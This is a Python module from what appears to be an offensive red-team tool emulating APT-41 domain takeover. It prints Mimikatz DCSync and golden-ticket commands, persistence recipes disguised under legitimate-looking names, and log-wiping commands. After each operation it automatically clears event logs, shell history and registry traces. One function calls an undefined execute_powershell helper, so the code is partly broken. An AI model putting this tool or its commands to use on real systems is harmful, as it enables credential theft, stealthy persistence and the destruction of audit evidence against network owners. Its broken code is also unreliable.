"""Consolidation & Dominance Module"""

from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich import box
from rich.console import Console
from modules.loghunter_integration import WindowsMoonwalk


class ConsolidationModule:
    """Module for consolidation and strategic objectives"""
    
    def __init__(self):
        self.moonwalk = None
    
    def run(self, console: Console, session_data: dict):
        """Run consolidation module"""
        if not self.moonwalk:
            self.moonwalk = WindowsMoonwalk(console, session_data)
        while True:
            console.print(Panel(
                "[bold]Consolidation & Dominance[/bold]\n\n"
                "Strategic objectives, persistence, and environment-wide control.\n"
                "[dim]Moonwalk: Auto-clearing logs and traces after each operation[/dim]",
                title="Module 5",
                border_style="cyan"
            ))
            console.print()
            
            table = Table(box=box.SIMPLE, show_header=False)
            table.add_column("Option", style="cyan", width=3)
            table.add_column("Function", style="white")
            
            table.add_row("1", "Strategic Objectives [APT-41: Objectives]")
            table.add_row("2", "Domain Controller Access [APT-41: Credential Access]")
            table.add_row("3", "Persistence Mechanisms [APT-41: Persistence]")
            table.add_row("4", "Central Control Planes [APT-41: Persistence]")
            table.add_row("5", "Clean-up Considerations [APT-41: Defense Evasion]")
            table.add_row("6", "APT-41 Persistence Techniques")
            table.add_row("0", "Return to main menu")
            
            console.print(table)
            console.print()
            
            choice = Prompt.ask("Select function", choices=['0', '1', '2', '3', '4', '5', '6'], default='0')
            
            if choice == '0':
                break
            elif choice == '1':
                self._strategic_objectives(console, session_data)
            elif choice == '2':
                self._domain_controller(console, session_data)
            elif choice == '3':
                self._persistence(console, session_data)
            elif choice == '4':
                self._control_planes(console, session_data)
            elif choice == '5':
                self._cleanup(console, session_data)
            elif choice == '6':
                self._apt41_persistence(console, session_data)
            
            # Moonwalk cleanup after persistence operations (enabled by default)
            if choice != '0':
                self._moonwalk_cleanup(console, 'persistence')
            
            console.print()
    
    def _moonwalk_cleanup(self, console: Console, operation_type: str):
        """Perform moonwalk cleanup after operation"""
        try:
            console.print("\n[yellow]Running moonwalk cleanup...[/yellow]")
            results = self.moonwalk.cleanup_after_operation(operation_type)
            
            if results.get('event_logs', {}).get('cleared'):
                console.print(f"[green]Cleared {len(results['event_logs']['cleared'])} event logs[/green]")
            if results.get('powershell_history'):
                console.print("[green]Cleared PowerShell history[/green]")
            if results.get('command_history'):
                console.print("[green]Cleared command history[/green]")
            if results.get('registry_traces', {}).get('cleared'):
                console.print(f"[green]Cleared {len(results['registry_traces']['cleared'])} registry traces[/green]")
        except Exception as e:
            console.print(f"[yellow]Moonwalk cleanup error: {e}[/yellow]")
    
    def _strategic_objectives(self, console: Console, session_data: dict):
        """Strategic objectives"""
        console.print("\n[bold cyan]Strategic Objectives[/bold cyan]\n")
        
        console.print("[bold]High-Value Targets:[/bold]")
        targets = {
            "Domain Controllers": [
                "Directory manipulation",
                "Group Policy modification",
                "Credential extraction (DCSync)",
                "Golden ticket creation"
            ],
            "PKI Servers": [
                "Certificate authority compromise",
                "Certificate theft/forgery",
                "Code signing certificate access"
            ],
            "Backup/DR Systems": [
                "Backup credential access",
                "Restore malicious configurations",
                "Backup data exfiltration"
            ],
            "Deployment Pipelines": [
                "CI/CD compromise",
                "Software deployment control",
                "Malicious update injection"
            ],
            "Management Systems": [
                "SCCM compromise",
                "WSUS manipulation",
                "Monitoring system control"
            ]
        }
        
        for target, methods in targets.items():
            console.print(f"[bold]{target}:[/bold]")
            for method in methods:
                console.print(f"  • {method}")
            console.print()
        
        console.print("[bold]Transition Point:[/bold]")
        console.print("  When lateral movement transitions to environment-wide control:")
        console.print("  • Directory and group policies can be manipulated")
        console.print("  • Deployment tools can push software across estate")
        console.print("  • Credential/PKI infrastructure can be influenced")
    
    def _domain_controller(self, console: Console, session_data: dict):
        """Domain controller access and manipulation"""
        console.print("\n[bold cyan]Domain Controller Access[/bold cyan]\n")
        
        console.print("[bold]DC Enumeration:[/bold]")
        enum_cmds = [
            "nltest /dclist:<domain>",
            "[PowerShell] Get-ADDomainController",
            "[PowerShell] Get-ADForest | Select-Object DomainControllers",
            "net group \"Domain Controllers\" /domain"
        ]
        
        for cmd in enum_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]DCSync Attack:[/bold]")
        dcsync_cmds = [
            "Mimikatz: lsadump::dcsync /user:<user>",
            "Mimikatz: lsadump::dcsync /user:krbtgt",
            "Mimikatz: lsadump::dcsync /all",
            "[PowerShell] Invoke-DCSync -Paged",
            "Requires: Replicating Directory Changes, Replicating Directory Changes All"
        ]
        
        for cmd in dcsync_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Golden Ticket:[/bold]")
        golden_ticket = [
            "Mimikatz: kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /krbtgt:<hash> /id:500 /ptt",
            "Rubeus: golden /krbtgt:<hash> /domain:<domain> /user:<user>",
            "Creates TGT that bypasses KDC validation",
            "Valid until krbtgt password changes"
        ]
        
        for cmd in golden_ticket:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Group Policy Manipulation:[/bold]")
        gpo_cmds = [
            "[PowerShell] Get-GPO -All",
            "[PowerShell] Get-GPOReport -All -ReportType Html",
            "[PowerShell] New-GPO -Name <name>",
            "[PowerShell] Set-GPRegistryValue -Name <GPO> -Key <key> -ValueName <value> -Value <data>",
            "GPO files: \\\\<domain>\\SYSVOL\\<domain>\\Policies\\"
        ]
        
        for cmd in gpo_cmds:
            console.print(f"  • {cmd}")
    
    def _persistence(self, console: Console, session_data: dict):
        """Persistence mechanisms"""
        console.print("\n[bold cyan]Persistence Mechanisms[/bold cyan]")
        console.print("[dim]TTP: T1053.005 (Scheduled Task), T1543.003 (Windows Service), T1053.003 (WMI)[/dim]\n")
        
        persistence_methods = {
            "Scheduled Tasks": [
                "schtasks /create /tn <task> /tr \"<command>\" /sc onlogon",
                "schtasks /create /tn <task> /tr \"<command>\" /sc daily /st <time>",
                "[PowerShell] Register-ScheduledTask -TaskName <name> -Action <action> -Trigger <trigger>",
                "Location: C:\\Windows\\System32\\Tasks\\"
            ],
            "Windows Services": [
                "sc create <service> binPath= \"<command>\" start= auto",
                "sc config <service> start= auto",
                "sc start <service>",
                "[PowerShell] New-Service -Name <name> -BinaryPathName <path>"
            ],
            "Startup Items": [
                "Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "Registry: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "Startup folder: %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
                "Startup folder: C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
            ],
            "WMI Event Subscriptions": [
                "[PowerShell] Create WMI event filter",
                "[PowerShell] Create WMI event consumer",
                "[PowerShell] Bind filter to consumer",
                "Survives reboots, less visible"
            ],
            "COM Hijacking": [
                "Hijack COM object loading",
                "Place malicious DLL in COM object path",
                "Registry: HKLM\\Software\\Classes\\CLSID\\{<guid>}\\InprocServer32"
            ],
            "GPO-based Persistence": [
                "Modify Group Policy to execute scripts",
                "GPO startup/shutdown scripts",
                "GPO scheduled tasks",
                "Affects entire domain/OU"
            ]
        }
        
        for method, commands in persistence_methods.items():
            console.print(f"[bold]{method}:[/bold]")
            for cmd in commands:
                console.print(f"  • {cmd}")
            console.print()
        
        console.print("\n[bold]TTP Context:[/bold]")
        console.print("  • T1053.005: Scheduled tasks for persistence and execution")
        console.print("  • T1543.003: Windows services for persistence")
        console.print("  • T1053.003: WMI event subscriptions for persistence")
        console.print("  • Multiple mechanisms provide redundancy")
        
        console.print("\n[bold]Persistence Preferences:[/bold]")
        persist_methods = [
            "Scheduled tasks with legitimate names",
            "WMI event subscriptions",
            "Services with legitimate names",
            "DLL sideloading with signed binaries",
            "Registry run keys (less common)"
        ]
        
        for method in persist_methods:
            console.print(f"  • [yellow]{method}[/yellow]")
        
        console.print("\n[bold]OPSEC Considerations:[/bold]")
        console.print("  • Prefer persistence on management boxes")
        console.print("  • Use names that resemble legitimate services")
        console.print("  • Avoid excessive modification of endpoints")
        console.print("  • Prefer controlling central control planes")
        console.print("  • Use multiple persistence mechanisms for redundancy")
    
    def _control_planes(self, console: Console, session_data: dict):
        """Central control planes"""
        console.print("\n[bold cyan]Central Control Planes[/bold cyan]\n")
        
        control_planes = {
            "Active Directory": [
                "Group Policy Objects",
                "OU structure",
                "User/computer accounts",
                "Delegation and trusts"
            ],
            "SCCM (System Center)": [
                "Software deployment",
                "Configuration management",
                "Remote control",
                "Client push installation"
            ],
            "WSUS (Windows Update)": [
                "Update deployment",
                "Update approval",
                "Malicious update injection"
            ],
            "Backup Systems": [
                "Veeam, Backup Exec, DPM",
                "Backup credential storage",
                "Restore capabilities",
                "Backup data access"
            ],
            "Monitoring Systems": [
                "SCOM, Nagios, Zabbix",
                "Alert suppression",
                "Agent deployment",
                "Configuration access"
            ],
            "Deployment Pipelines": [
                "CI/CD systems",
                "Build servers",
                "Package repositories",
                "Automated deployment"
            ]
        }
        
        for plane, capabilities in control_planes.items():
            console.print(f"[bold]{plane}:[/bold]")
            for cap in capabilities:
                console.print(f"  • {cap}")
            console.print()
        
        console.print("[bold]Strategy:[/bold]")
        console.print("  • Control central systems rather than individual endpoints")
        console.print("  • Leverage existing automation and deployment")
        console.print("  • Blend into normal administrative patterns")
    
    def _cleanup(self, console: Console, session_data: dict):
        """Clean-up considerations"""
        console.print("\n[bold cyan]Clean-up Considerations[/bold cyan]\n")
        
        console.print("[bold]Artifact Removal:[/bold]")
        cleanup_items = [
            "Temporary files and scripts",
            "Service accounts created for lateral movement",
            "Scheduled tasks used for execution",
            "Event log entries (if possible)",
            "Network connections and sessions"
        ]
        
        for item in cleanup_items:
            console.print(f"  • {item}")
        
        console.print("\n[bold]Event Log Manipulation:[/bold]")
        log_cmds = [
            "wevtutil cl <log_name>",
            "[PowerShell] Clear-EventLog -LogName <log>",
            "[PowerShell] Remove-EventLog -LogName <log>",
            "Requires appropriate permissions"
        ]
        
        for cmd in log_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]File Cleanup:[/bold]")
        file_cmds = [
            "del /f /s /q <file>",
            "[PowerShell] Remove-Item -Path <path> -Recurse -Force",
            "sdelete.exe <file> (secure delete)",
            "cipher /w:<drive> (wipe free space)"
        ]
        
        for cmd in file_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]APT-41 Clean-up Techniques:[/bold]")
        apt41_cleanup = [
            "Clear event logs after operations",
            "Remove temporary files and scripts",
            "Delete scheduled tasks after use",
            "Remove services after backdoor deployment",
            "Clean registry entries"
        ]
        
        for technique in apt41_cleanup:
            console.print(f"  • [yellow]{technique}[/yellow]")
        
        console.print("\n[bold]OPSEC Best Practices:[/bold]")
        practices = [
            "Minimize artifacts from the start",
            "Use built-in Windows mechanisms",
            "Prefer in-memory execution",
            "Clean up immediately after operations",
            "Avoid leaving persistent backdoors on many endpoints"
        ]
        
        for practice in practices:
            console.print(f"  • {practice}")
    
    def _apt41_persistence(self, console: Console, session_data: dict):
        """APT-41 Specific Persistence Techniques"""
        console.print("\n[bold cyan]APT-41 Persistence Techniques[/bold cyan]")
        console.print("[dim]APT-41 TTP: T1053.005, T1543.003, T1547.001 (Boot/Logon Autostart Execution: Registry Run Keys)[/dim]\n")
        
        lab_use = session_data.get('LAB_USE', 0)
        is_live = lab_use != 1
        
        console.print("[bold]APT-41 Primary Persistence Methods:[/bold]")
        methods = {
            "Scheduled Tasks": [
                "Create tasks with names like 'Update', 'Maintenance', 'System'",
                "Tasks execute PowerShell scripts",
                "Tasks run DLL sideloading",
                "Tasks execute from temp directories",
                "High privileges (SYSTEM)"
            ],
            "WMI Event Subscriptions": [
                "Create WMI event filters",
                "Bind to event consumers",
                "Execute on system events",
                "Survives reboots",
                "Less visible than scheduled tasks"
            ],
            "DLL Sideloading": [
                "Place malicious DLL with legitimate executable",
                "Uses signed executables",
                "DLL loaded automatically",
                "Persistence via scheduled task or service",
                "Harder to detect"
            ],
            "Windows Services": [
                "Create services with legitimate names",
                "Services execute backdoors",
                "Auto-start on boot",
                "Run as SYSTEM",
                "Less common than scheduled tasks"
            ]
        }
        
        for method, details in methods.items():
            console.print(f"[bold]{method}:[/bold]")
            for detail in details:
                console.print(f"  • {detail}")
            console.print()
        
        console.print("[bold]APT-41 Persistence Naming Conventions:[/bold]")
        naming = [
            "Use names similar to Windows system tasks",
            "Include words like 'Update', 'Maintenance', 'System'",
            "Avoid suspicious names",
            "Match existing task/service patterns",
            "Use legitimate-looking descriptions"
        ]
        
        for convention in naming:
            console.print(f"  • [yellow]{convention}[/yellow]")
        
        if is_live or Confirm.ask("\n[bold]Check for APT-41 persistence indicators?[/bold]", default=False):
            console.print("\n[yellow]Checking for persistence indicators...[/yellow]\n")
            
            # Check scheduled tasks
            ps_cmd = "Get-ScheduledTask | Where-Object {$_.TaskName -match 'update|maintenance|system'} | Select-Object TaskName, State, Actions"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
            if exit_code == 0:
                console.print(f"[green]Suspicious Scheduled Tasks:[/green]\n{stdout}")
            
            # Check WMI event subscriptions
            ps_cmd = "Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Select-Object Name, Query"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
            if exit_code == 0:
                console.print(f"[green]WMI Event Filters:[/green]\n{stdout}")
            
            # Check services
            ps_cmd = "Get-Service | Where-Object {$_.DisplayName -match 'update|maintenance|system'} | Select-Object Name, DisplayName, Status"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
            if exit_code == 0:
                console.print(f"[green]Suspicious Services:[/green]\n{stdout}")
